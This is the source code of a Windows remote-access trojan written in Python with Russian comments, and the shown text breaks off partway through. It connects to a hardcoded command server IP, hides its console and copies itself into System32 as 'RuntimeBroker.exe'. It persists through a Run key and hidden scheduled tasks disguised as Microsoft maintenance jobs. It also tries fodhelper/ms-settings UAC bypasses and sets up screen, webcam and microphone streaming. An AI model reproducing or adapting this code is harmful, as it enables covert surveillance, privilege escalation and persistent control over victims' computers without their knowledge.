import os
import sys
import json
import time
import re
import psutil
import platform
import socket
import zipfile
import io
import fractions

# DPI Awareness — без этого скриншоты чёрные на масштабированных дисплеях
if platform.system() == "Windows":
    import ctypes
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)  # PROCESS_PER_MONITOR_DPI_AWARE
    except Exception:
        pass

def _log_to_file(msg):
    """Логирование в файл для диагностики"""
    try:
        import datetime as _dt
        with open(os.path.join(os.path.expanduser("~"), "agent_debug.log"), "a", encoding="utf-8") as f:
            f.write(f"[{_dt.datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except:
        pass

# Скрываем консоль при запуске (Windows)
if platform.system() == "Windows":
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE

import base64
import sqlite3
import shutil
import subprocess
import threading
import socketio
import atexit
from datetime import datetime, timedelta, timezone
from PIL import ImageGrab, Image, ImageSequence
from Cryptodome.Cipher import AES
import urllib.request
import webbrowser
import tkinter as tk
from threading import Lock
import requests

# ═══════════════════════════════════════════════════════════════
# WINDOWS IMPORTS
# ═══════════════════════════════════════════════════════════════
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes
    import win32crypt
    import win32gui
    import win32con
    import win32process
    import win32api
    import winreg
    import msvcrt
    fcntl = None

    def is_admin():
        """Проверяет, запущен ли процесс с правами администратора."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    try:
        import win32com.client
        _HAS_WIN32COM = True
    except ImportError:
        _HAS_WIN32COM = False

    try:
        import cv2
    except ImportError:
        cv2 = None

    try:
        import pyaudiowpatch as pyaudio
    except ImportError:
        try:
            import pyaudio
        except ImportError:
            pyaudio = None

    # Опционально пытаемся импортировать pyogg для Opus
    opus_available = False
    try:
        from pyogg import OpusEncoder, OpusDecoder
        opus_available = True
    except Exception:
        opus_available = False

    # WebRTC для стриминга
    try:
        from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, MediaStreamTrack, RTCConfiguration, RTCIceServer, RTCIceCandidate
        from aiortc.sdp import candidate_from_sdp
        from aiortc.contrib.media import MediaBlackhole, MediaPlayer, MediaRecorder
        import av
        import mss
        import asyncio
        import queue
        aiortc_available = True

        # === ПАТЧ: логирование ошибок TURN в aioice ===
        import logging
        import aioice.ice as _aioice_ice

        # Включаем логирование aioice для диагностики TURN
        logging.basicConfig(level=logging.WARNING)
        _aioice_logger = logging.getLogger("aioice")
        _aioice_logger.setLevel(logging.DEBUG)
        _turn_logger = logging.getLogger("aioice.turn")
        _turn_logger.setLevel(logging.DEBUG)

        # Добавляем handler чтобы писать в наш лог-файл
        class _AioiceLogHandler(logging.Handler):
            def emit(self, record):
                _log_to_file(f"[aioice.{record.name}] {record.getMessage()}")
        _aioice_handler = _AioiceLogHandler()
        _aioice_logger.addHandler(_aioice_handler)
        _turn_logger.addHandler(_aioice_handler)

        # Патчим get_component_candidates чтобы логировать ошибки TURN
        _original_get_component_candidates = _aioice_ice.Connection.get_component_candidates
        async def _patched_get_component_candidates(self, component, addresses, timeout=5):
            _log_to_file(f"[TURN-DIAG] Gathering candidates, component={component}, turn_server={self.turn_server}, stun_server={self.stun_server}")
            candidates = []
            loop = asyncio.get_event_loop()

            # gather host candidates
            host_protocols = []
            for address in addresses:
                try:
                    transport, protocol = await loop.create_datagram_endpoint(
                        lambda: _aioice_ice.StunProtocol(self), local_addr=(address, 0)
                    )
                    sock = transport.get_extra_info("socket")
                    if sock is not None:
                        import socket as _socket
                        sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_RCVBUF, 262144)
                except OSError as exc:
                    _log_to_file(f"[TURN-DIAG] Could not bind to {address} - {exc}")
                    continue
                host_protocols.append(protocol)

                candidate_address = protocol.transport.get_extra_info("sockname")
                protocol.local_candidate = _aioice_ice.Candidate(
                    foundation=_aioice_ice.candidate_foundation("host", "udp", candidate_address[0]),
                    component=component,
                    transport="udp",
                    priority=_aioice_ice.candidate_priority(component, "host"),
                    host=candidate_address[0],
                    port=candidate_address[1],
                    type="host",
                )
                if self._transport_policy == _aioice_ice.TransportPolicy.ALL:
                    candidates.append(protocol.local_candidate)
            self._protocols += host_protocols

            tasks = []

            # STUN
            if self.stun_server:
                import ipaddress as _ipaddr
                for protocol in host_protocols:
                    if _ipaddr.ip_address(protocol.local_candidate.host).version == 4:
                        tasks.append(asyncio.create_task(
                            _aioice_ice.server_reflexive_candidate(protocol, self.stun_server)
                        ))

            # TURN
            if self.turn_server:
                _log_to_file(f"[TURN-DIAG] Creating TURN relay candidate task: server={self.turn_server}, user={self.turn_username}, transport={self.turn_transport}")
                tasks.append(asyncio.create_task(
                    _aioice_ice.relayed_candidate(
                        component=component,
                        protocol_factory=lambda: _aioice_ice.StunProtocol(self),
                        turn_server=self.turn_server,
                        turn_username=self.turn_username,
                        turn_password=self.turn_password,
                        turn_ssl=self.turn_ssl,
                        turn_transport=self.turn_transport,
                    )
                ))
            else:
                _log_to_file(f"[TURN-DIAG] NO TURN SERVER configured!")

            if len(tasks):
                done, pending = await asyncio.wait(tasks, timeout=timeout)
                for task in done:
                    exc = task.exception()
                    if exc is None:
                        candidate, protocol = task.result()
                        _log_to_file(f"[TURN-DIAG] Candidate gathered: type={candidate.type}, host={candidate.host}:{candidate.port}")
                        candidates.append(candidate)
                        if protocol is not None:
                            self._protocols.append(protocol)
                    else:
                        _log_to_file(f"[TURN-DIAG] *** CANDIDATE GATHERING FAILED: {type(exc).__name__}: {exc}")
                for task in pending:
                    _log_to_file(f"[TURN-DIAG] *** CANDIDATE GATHERING TIMED OUT (task cancelled after {timeout}s)")
                    task.cancel()

            _log_to_file(f"[TURN-DIAG] Total candidates gathered: {len(candidates)} types: {[c.type for c in candidates]}")
            return candidates

        _aioice_ice.Connection.get_component_candidates = _patched_get_component_candidates
        _log_to_file("[TURN-DIAG] aioice patched for TURN diagnostics")
        # === КОНЕЦ ПАТЧА ===

    except Exception as e:
        aiortc_available = False
        print(f"[WebRTC] aiortc not available: {e}")
else:
    fcntl = None
    msvcrt = None

    def is_admin():
        return False

_lock_file = None

def acquire_single_instance_lock():
    """Обеспечивает запуск только одного экземпляра программы."""
    global _lock_file
    
    # Если мы elevated процесс, пропускаем lock
    if '--elevated' in sys.argv:
        return True
    
    if platform.system() == "Windows":
        try:
            temp_dir = os.environ.get('TEMP', os.environ.get('TMP', 'C:\\Windows\\Temp'))
            lock_path = os.path.join(temp_dir, 'discord_agent.lock')
            _lock_file = open(lock_path, 'w')
            if msvcrt:
                msvcrt.locking(_lock_file.fileno(), msvcrt.LK_NBLCK, 1)
            return True
        except (IOError, OSError):
            if _lock_file:
                try:
                    _lock_file.close()
                except:
                    pass
                _lock_file = None
            return False
    else:
        try:
            lock_path = '/tmp/discord_agent.lock'
            _lock_file = open(lock_path, 'w')
            if fcntl:
                fcntl.flock(_lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            return True
        except (IOError, OSError):
            if _lock_file:
                try:
                    _lock_file.close()
                except:
                    pass
                _lock_file = None
            return False

def release_single_instance_lock():
    """Освобождает lock файл."""
    global _lock_file
    if _lock_file:
        try:
            _lock_file.close()
        except:
            pass
        _lock_file = None

# Регистрируем cleanup при выходе
atexit.register(release_single_instance_lock)

# ═══════════════════════════════════════════════════════════════
# STEALTH INSTALLATION
# ═══════════════════════════════════════════════════════════════

def install_stealth():
    """Устанавливает программу в системную папку с маскировкой."""
    if platform.system() != "Windows":
        return

    try:
        current_path = os.path.abspath(sys.argv[0])
        system_dir = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32')
        target_path = os.path.join(system_dir, 'RuntimeBroker.exe')

        # Проверяем, уже ли мы в системной папке
        if os.path.normpath(current_path).lower() == os.path.normpath(target_path).lower():
            return  # Уже установлены

        # Копируем себя в системную папку
        try:
            shutil.copy2(current_path, target_path)
        except PermissionError:
            # Если нет прав, пробуем через AppData
            appdata = os.environ.get('APPDATA')
            target_path = os.path.join(appdata, 'Microsoft', 'Windows', 'RuntimeBroker.exe')
            os.makedirs(os.path.dirname(target_path), exist_ok=True)
            shutil.copy2(current_path, target_path)

        # Добавляем в автозагрузку через реестр
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, 'RuntimeBroker', 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(key)
        except:
            pass

        # Запускаем копию из новой локации
        if platform.system() == "Windows":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            subprocess.Popen(
                [target_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            )

        # Удаляем исходный файл через cmd с задержкой
        if current_path.lower().endswith('.exe'):
            delete_cmd = f'cmd.exe /c timeout /t 2 /nobreak > nul & del /f /q "{current_path}"'
            subprocess.Popen(
                delete_cmd,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

        # Завершаем текущий процесс
        sys.exit(0)

    except Exception as e:
        pass  # Тихо игнорируем ошибки установки

# Запускаем установку при первом запуске
if '--no-install' not in sys.argv:
    install_stealth()

class _SilentWriter:
    """Фейковый writer, который ничего не пишет."""
    def write(self, *args, **kwargs):
        pass
    def flush(self, *args, **kwargs):
        pass
    def close(self, *args, **kwargs):
        pass

# Подмена stdout/stderr на "пустышку"
# sys.stdout = _SilentWriter()
# sys.stderr = _SilentWriter()

# Переопределение встроенного print (двойная защита)
# def print(*args, **kwargs):
#     """Заглушка для print() — ничего не делает."""
#     pass

# Подавление исключений при записи в stdout (тройная защита)
# import builtins
# builtins.print = print

# ═══════════════════════════════════════════════════════════════════
# UTILITY КЛАССЫ
# ═══════════════════════════════════════════════════════════════════

class _ThreadSafeDict:
    """Потокобезопасный словарь с Lock."""
    def __init__(self):
        self._data = {}
        self._lock = Lock()
    
    def __setitem__(self, key, value):
        with self._lock:
            self._data[key] = value
    
    def __getitem__(self, key):
        with self._lock:
            return self._data[key]
    
    def __delitem__(self, key):
        with self._lock:
            if key in self._data:
                del self._data[key]
    
    def __contains__(self, key):
        with self._lock:
            return key in self._data
    
    def get(self, key, default=None):
        with self._lock:
            return self._data.get(key, default)
    
    def pop(self, key, default=None):
        with self._lock:
            return self._data.pop(key, default)
    
    def items(self):
        with self._lock:
            return list(self._data.items())
    
    def keys(self):
        with self._lock:
            return list(self._data.keys())


class _TempFileTracker:
    """Отслеживание временных файлов для cleanup при выходе."""
    _files = set()
    _lock = Lock()
    
    @classmethod
    def add(cls, filepath: str):
        """Добавить файл в трекинг."""
        with cls._lock:
            cls._files.add(filepath)
    
    @classmethod
    def remove(cls, filepath: str):
        """Удалить файл из трекинга и с диска."""
        try:
            if os.path.exists(filepath):
                os.remove(filepath)
        except:
            pass
        
        with cls._lock:
            cls._files.discard(filepath)
    
    @classmethod
    def cleanup_all(cls):
        """Удалить все отслеживаемые файлы."""
        with cls._lock:
            for filepath in list(cls._files):
                try:
                    if os.path.exists(filepath):
                        os.remove(filepath)
                except:
                    pass
            cls._files.clear()

atexit.register(_TempFileTracker.cleanup_all)

# Регистрируем очистку реестра при выходе
def _cleanup_registry_on_exit():
    """Восстанавливает реестр DisableTaskMgr при аварийном завершении."""
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except Exception:
            pass

atexit.register(_cleanup_registry_on_exit)

PANEL_URL = os.environ.get('C2_PANEL_URL', 'http://141.147.45.169:5000')
HEARTBEAT_INTERVAL = int(os.environ.get('C2_HEARTBEAT_INTERVAL', '30'))

# ═══════════════════════════════════════════════════════════════
# SOCKETIO CLIENT
# ═══════════════════════════════════════════════════════════════

sio = socketio.Client(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=2,
    reconnection_delay_max=10,
    logger=True,
    engineio_logger=True,
    request_timeout=10,
    http_session=None
)

agent_id = None

# Глобальные переменные (thread-safe)
host_channel = None
hostname = socket.gethostname().lower().replace(" ", "-").replace("_", "-")[:25]
last_heartbeat = datetime.now(timezone.utc)
initial_connection_time = None
windows_cache = {}

active_terminals = _ThreadSafeDict()
fullscreen_windows = _ThreadSafeDict()
active_sounds = _ThreadSafeDict()
active_chats = _ThreadSafeDict()
blocked_apps = _ThreadSafeDict()  # Заблокированные приложения: {process_name: {'title': ..., 'pid': ...}}
taskmgr_monitor_active = False
taskmgr_monitor_thread = None

# Screen streaming state
screen_stream_active = False
screen_stream_thread = None
screen_stream_interval = 0.05  # seconds (20 FPS)
screen_stream_monitor = 0  # 0 = primary monitor, 1 = secondary, etc.
screen_stream_lock = threading.Lock()  # Блокировка для безопасного доступа

# Webcam stream state
webcam_stream_active = False
webcam_stream_thread = None
webcam_stream_interval = 0.2  # seconds (5 FPS)
webcam_stream_lock = threading.Lock()

# WebRTC stream state
webrtc_peer_connection = None
webrtc_stream_active = False
webrtc_video_track = None
webrtc_audio_track = None
webrtc_lock = threading.Lock()
webrtc_event_loop = None
webrtc_event_loop_thread = None
webrtc_task_queue = None
webrtc_microphone_enabled = True  # По умолчанию включен
webrtc_system_audio_enabled = True  # По умолчанию включен
webrtc_active_viewer_sid = None  # SID активного зрителя

# Audio stream state - два независимых потока
microphone_stream_active = False
microphone_stream_thread = None
microphone_stream_lock = threading.Lock()
microphone_device_index = None  # None = default microphone

system_audio_stream_active = False
system_audio_stream_thread = None
system_audio_stream_lock = threading.Lock()

# Voice channel state
voice_client = None
voice_stream_active = False

# Agent control flags
should_stop_agent = False
should_uninstall_agent = False
uninstall_bat_path = None
voice_stream_thread = None
voice_stream_stop = threading.Event()
voice_stream_lock = threading.Lock()

# Подавление вывода для скомпилированных EXE
if getattr(sys, 'frozen', False):
    # sys.stdout = open(os.devnull, 'w')
    # sys.stderr = open(os.devnull, 'w')
    pass

# ═══════════════════════════════════════════════════════════════════
# WINDOWS PERSISTENCE (УЛУЧШЕННАЯ)
# ═══════════════════════════════════════════════════════════════════

if platform.system() == "Windows":

    def get_system_directory():
        """Получает путь к System32."""
        try:
            system_dir = ctypes.create_unicode_buffer(260)
            ctypes.windll.kernel32.GetSystemDirectoryW(system_dir, 260)
            return system_dir.value
        except:
            return r"C:\Windows\System32"


    def uac_bypass_silent_cleanup():
        """Тихий UAC bypass через CleanMgr с автоматической очисткой."""
        try:
            current_exe = get_executable_path()

            # Используем cleanmgr.exe
            cleanmgr_path = os.path.join(get_system_directory(), "cleanmgr.exe")
            if not os.path.exists(cleanmgr_path):
                return False

            key_path = r"Software\Classes\ms-settings\Shell\Open\command"

            # Создаём ключ с командой запуска
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)

            # Создаём batch файл для запуска
            batch_content = f'''@echo off
    start "" "{current_exe}"
    timeout /t 2 /nobreak >nul
    reg delete "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /f >nul 2>&1
    del /f /q "%~f0" >nul 2>&1
    '''

            batch_path = os.path.join(os.environ.get('TEMP'), f'cleanup_{os.getpid()}.cmd')
            with open(batch_path, 'w') as f:
                f.write(batch_content)

            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'cmd.exe /c "{batch_path}"')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            # Запускаем через ms-settings:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE

            subprocess.Popen(
                ['cmd.exe', '/c', 'start', 'ms-settings:'],
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            return True

        except Exception as e:
            _log_to_file(f"UAC bypass ms-settings failed: {e}")
            return False


    def create_elevated_copy():
        """Создаёт elevated копию через PowerShell."""
        try:
            current_exe = get_executable_path()

            # PowerShell команда для запуска с правами админа
            ps_command = f'''
    Start-Process -FilePath "{current_exe}" -Verb RunAs -WindowStyle Hidden
    '''

            # Сохраняем в temp файл
            ps_path = os.path.join(os.environ.get('TEMP'), f'elevate_{os.getpid()}.ps1')
            with open(ps_path, 'w') as f:
                f.write(ps_command)

            _TempFileTracker.add(ps_path)

            # Запускаем PowerShell
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE

            result = subprocess.run(
                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_path],
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=10
            )

            _TempFileTracker.remove(ps_path)

            return result.returncode == 0

        except Exception:
            return False


    def attempt_privilege_escalation():
        """Попытка elevation через Task Scheduler (работает тише UAC)."""
        if is_admin():
            return True
        
        if not getattr(sys, 'frozen', False):
            return False
        
        # Проверяем аргументы командной строки
        if '--elevated' in sys.argv:
            return True
        
        log_path = os.path.join(os.environ.get('TEMP'), f'uac_log_{os.getpid()}.txt')
        
        try:
            with open(log_path, 'w') as f:
                f.write(f"UAC attempt started\n")
                f.write(f"Windows Build: {get_windows_version()}\n")
                f.write(f"Is Admin: {is_admin()}\n\n")
            
            # Пробуем тихий bypass через fodhelper
            with open(log_path, 'a') as f:
                f.write("Trying fodhelper bypass...\n")
            
            if simple_uac_bypass_fodhelper():
                with open(log_path, 'a') as f:
                    f.write("Fodhelper initiated, exiting\n")
                release_single_instance_lock()
                time.sleep(3)
                sys.exit(0)
            
            # Если fodhelper не сработал, пробуем Task Scheduler
            with open(log_path, 'a') as f:
                f.write("Fodhelper failed, trying Task Scheduler...\n")
            
            current_exe = get_executable_path()
            task_name = f"SystemMaintenanceTask_{os.getpid()}"
            
            # Создаём задачу с highest privileges
            xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <RegistrationInfo>
        <Description>System Maintenance</Description>
      </RegistrationInfo>
      <Triggers>
        <TimeTrigger>
          <StartBoundary>{datetime.now().isoformat()}</StartBoundary>
          <Enabled>true</Enabled>
        </TimeTrigger>
      </Triggers>
      <Principals>
        <Principal>
          <LogonType>InteractiveToken</LogonType>
          <RunLevel>HighestAvailable</RunLevel>
        </Principal>
      </Principals>
      <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>false</AllowHardTerminate>
        <StartWhenAvailable>true</StartWhenAvailable>
        <Enabled>true</Enabled>
        <Hidden>true</Hidden>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
      </Settings>
      <Actions>
        <Exec>
          <Command>{current_exe}</Command>
          <Arguments>--elevated</Arguments>
        </Exec>
      </Actions>
    </Task>'''
            
            xml_path = os.path.join(os.environ.get('TEMP'), f'task_{os.getpid()}.xml')
            with open(xml_path, 'w', encoding='utf-16') as f:
                f.write(xml_content)
            
            _TempFileTracker.add(xml_path)
            
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            
            # Создаём задачу (может показать UAC, но только один раз)
            create_result = subprocess.run(
                f'schtasks /Create /TN "{task_name}" /XML "{xml_path}" /F',
                shell=True,
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True,
                timeout=30
            )
            
            if create_result.returncode == 0:
                with open(log_path, 'a') as f:
                    f.write("Task created, running...\n")
                
                # Запускаем задачу
                subprocess.run(
                    f'schtasks /Run /TN "{task_name}"',
                    shell=True,
                    startupinfo=si,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    timeout=5
                )
                
                # Удаляем задачу через 10 секунд
                def cleanup_task():
                    time.sleep(10)
                    try:
                        subprocess.run(
                            f'schtasks /Delete /TN "{task_name}" /F',
                            shell=True,
                            startupinfo=si,
                            creationflags=subprocess.CREATE_NO_WINDOW,
                            timeout=5
                        )
                    except:
                        pass
                    
                threading.Thread(target=cleanup_task, daemon=True).start()
                
                _TempFileTracker.remove(xml_path)
                release_single_instance_lock()
                
                with open(log_path, 'a') as f:
                    f.write("Task Scheduler method successful, exiting\n")
                
                time.sleep(2)
                sys.exit(0)
            
            _TempFileTracker.remove(xml_path)
            
            with open(log_path, 'a') as f:
                f.write("All methods failed\n")
            
        except Exception as e:
            try:
                with open(log_path, 'a') as f:
                    f.write(f"Error: {str(e)}\n")
            except:
                pass
            
        return False
    
    def simple_uac_bypass_fodhelper():
        """Простой UAC bypass через fodhelper без зацикливания."""
        try:
            current_exe = get_executable_path()

            # Проверяем, что мы не в цикле
            if os.environ.get('UAC_BYPASS_ACTIVE'):
                return False

            # Устанавливаем флаг
            os.environ['UAC_BYPASS_ACTIVE'] = '1'

            key_path = r"Software\Classes\ms-settings\Shell\Open\command"

            # Очищаем старый ключ
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
            
            # Создаём ключ с флагом elevated
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{current_exe}" --elevated')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            # Запускаем fodhelper
            fodhelper_path = os.path.join(get_system_directory(), "fodhelper.exe")
            if os.path.exists(fodhelper_path):
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                si.wShowWindow = subprocess.SW_HIDE

                subprocess.Popen([fodhelper_path], startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)

                # Очищаем ключ через 3 секунды
                def cleanup():
                    time.sleep(3)
                    try:
                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    except:
                        pass
                    
                threading.Thread(target=cleanup, daemon=True).start()
                return True

            return False

        except Exception as e:
            _log_to_file(f"UAC bypass fodhelper failed: {e}")
            return False


    def request_admin_rights():
        """Запрашивает права администратора через стандартный UAC."""
        try:
            current_exe = get_executable_path()

            # Создаём PowerShell скрипт для elevation
            ps_script = f'''
    try {{
        Start-Process -FilePath "{current_exe}" -ArgumentList "--elevated" -Verb RunAs -WindowStyle Hidden
    }} catch {{
        exit 1
    }}
    '''

            ps_path = os.path.join(os.environ.get('TEMP'), f'elevate_{os.getpid()}.ps1')
            with open(ps_path, 'w', encoding='utf-8') as f:
                f.write(ps_script)

            _TempFileTracker.add(ps_path)

            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE

            result = subprocess.run(
                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_path],
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=30
            )

            _TempFileTracker.remove(ps_path)
            return result.returncode == 0

        except Exception:
            return False


    def get_windows_version():
        """Получает версию Windows."""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            build = winreg.QueryValueEx(key, "CurrentBuild")[0]
            winreg.CloseKey(key)
            return int(build)
        except:
            return 0

    def get_executable_path():
        """Возвращает путь к текущему исполняемому файлу."""
        if getattr(sys, 'frozen', False):
            return sys.executable
        else:
            return os.path.abspath(__file__)
    
    
    def check_defender_exists():
        """Проверяет наличие Windows Defender."""
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            
            result = subprocess.run(
                'sc query WinDefend',
                shell=True,
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True,
                timeout=3
            )
            
            return result.returncode == 0
        except:
            return False
    
    
    def add_to_startup(executable_path):
        """
        Скрытая автозагрузка через COM Task Scheduler API.
        Не оставляет следов в командной строке, работает тише schtasks.
        """
        if not _HAS_WIN32COM:
            return add_to_startup_via_schtasks(
                executable_path,
                "\\Microsoft\\Windows\\Shell\\FamilySafetyMonitor",
                "Family Safety Monitor Task"
            )
        
        try:
            import random
            
            task_pool = [
                "\\Microsoft\\Windows\\Maintenance\\WinSAT",
                "\\Microsoft\\Windows\\MemoryDiagnostic\\RunFullMemoryDiagnostic",
                "\\Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeSystem",
                "\\Microsoft\\Windows\\Registry\\RegIdleBackup",
                "\\Microsoft\\Windows\\SystemRestore\\SR",
            ]
            
            task_name = random.choice(task_pool)
            
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            
            root_folder = scheduler.GetFolder('\\')
            task_def = scheduler.NewTask(0)
            
            task_def.RegistrationInfo.Description = "System maintenance and diagnostics"
            task_def.RegistrationInfo.Author = "Microsoft Corporation"
            
            task_def.Settings.Enabled = True
            task_def.Settings.Hidden = True
            task_def.Settings.StartWhenAvailable = True
            task_def.Settings.DisallowStartIfOnBatteries = False
            task_def.Settings.StopIfGoingOnBatteries = False
            task_def.Settings.AllowHardTerminate = False
            task_def.Settings.ExecutionTimeLimit = 'PT0S'
            task_def.Settings.Priority = 6
            task_def.Settings.WakeToRun = True

            # Триггер 1: Logon — при входе пользователя
            trigger1 = task_def.Triggers.Create(9)  # TASK_TRIGGER_LOGON
            trigger1.Delay = 'PT30S'
            trigger1.Enabled = True

            # Триггер 2: Boot — при загрузке системы (независимо от логина)
            trigger2 = task_def.Triggers.Create(8)  # TASK_TRIGGER_BOOT
            trigger2.Delay = 'PT60S'
            trigger2.Enabled = True

            # Триггер 3: Idle — если первые два не сработали
            trigger3 = task_def.Triggers.Create(6)  # TASK_TRIGGER_IDLE
            trigger3.Enabled = True

            action = task_def.Actions.Create(0)  # TASK_ACTION_EXEC
            action.Path = executable_path
            action.WorkingDirectory = os.path.dirname(executable_path)
            
            root_folder.RegisterTaskDefinition(
                task_name,
                task_def,
                6,  # TASK_CREATE_OR_UPDATE
                None,
                None,
                3,  # TASK_LOGON_INTERACTIVE_TOKEN
                None
            )

            return True

        except Exception as e:
            _log_to_file(f"COM Task Scheduler persistence failed: {e}")
            return add_to_startup_via_schtasks(
                executable_path,
                "\\Microsoft\\Windows\\Shell\\FamilySafetyMonitor",
                "Family Safety Monitor Task"
            )
    
    
    def add_to_startup_via_schtasks(executable_path, task_name, task_description):
        """Резервный метод через schtasks."""
        try:
            xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>{task_description}</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT60S</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>{os.environ.get('USERNAME')}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>6</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{executable_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            xml_path = os.path.join(os.environ.get('TEMP'), f'tsk_{os.getpid()}.xml')
            with open(xml_path, 'w', encoding='utf-16') as f:
                f.write(xml_template)
            
            _TempFileTracker.add(xml_path)
            
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            
            result = subprocess.run(
                f'schtasks /Create /TN "{task_name}" /XML "{xml_path}" /F',
                shell=True,
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True,
                timeout=10
            )
            
            _TempFileTracker.remove(xml_path)

            return result.returncode == 0

        except Exception as e:
            _log_to_file(f"Task Scheduler persistence failed: {e}")
            return False
    
    
    def remove_from_startup():
        """Удаляет все точки автозагрузки."""
        removed = False
        
        task_names = [
            "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
            "\\Microsoft\\Windows\\Shell\\FamilySafetyMonitor",
            "\\Microsoft\\Windows\\Maintenance\\WinSAT",
            "\\Microsoft\\Windows\\MemoryDiagnostic\\RunFullMemoryDiagnostic",
